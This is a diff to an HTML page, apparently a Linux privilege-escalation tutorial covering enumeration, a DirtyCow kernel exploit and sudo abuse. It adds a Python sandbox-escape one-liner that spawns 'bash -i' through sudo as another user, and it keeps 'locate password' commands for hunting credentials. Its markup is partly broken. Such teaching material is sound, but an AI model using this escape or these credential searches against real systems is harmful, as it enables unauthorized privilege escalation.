@@ -108,8 +108,11 @@ It is important to note that there are User Enumeration commands among the Syste
 </span></span><span style="display:flex;"><span># locate password | more</span>
 </span></span><span style="display:flex;"><span># locate pass | more</span>
 </span></span><span style="display:flex;"><span># locate passwd | more</span>
-</span></span><span style="display:flex;"><span># history</span>
-</span></span><span style="display:flex;"><span># sudo su -</span>
+</code></div>
+</code>
+</pre><h3 id="adm-python-esc">adm Python Escape</h3>
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># echo 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("bash -i"))' > /tmp/lm && sudo -u jack_adm /user/bin/safe_python /tmp/lm   </span>
 </code></div>
 </code>
 In this entry we will see how to escalate privileges via kernel expoits with DirtyCow and via sudo rights with wget.
@@ -124,7 +127,7 @@ I would like to highlight that there are several other escalation paths. The esc
 <li>NFS Root Squashing</li>
 <li>Docker</li>
 </ul>
-</pre><h3 id="kernel-exp">Kernel Exploits</h3>
+</pre><h1 id="kernel-exp">Kernel Exploits</h1>
 What is a Kernel?</br>
 The Kernel is a computer program that controls everything in the system.</br>
 The Kernel helps interactions between hardware and software components.</br>
@@ -145,9 +148,9 @@ we can see that the /usr/bin/passwd and the /tmp/bak file has been backed up. It
 If we type the <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># passwd</span></span></span></code></div>
 command then press enter, we can see that we successfully escalated our privileges to root.</br></br>
 <img src="../screen2.png" height="100%" width="100%"></br>
-<h3 id="sudo-exp">Sudo</h3>
+<h1 id="sudo-exp">Sudo</h1>
 Escalating privileges with the sudo right of wget is discussed in the vk9-sec.com webpage which can be found among <s>us</s> the Useful References.</br>
-<h3 id="additional">Conclusion</h3>
+<h1 id="additional">Conclusion</h1>
 It is worth researching how to escalate privileges based on the output of the above initial enumeration commands.
 </br></br>
 ~Thank you for reading~
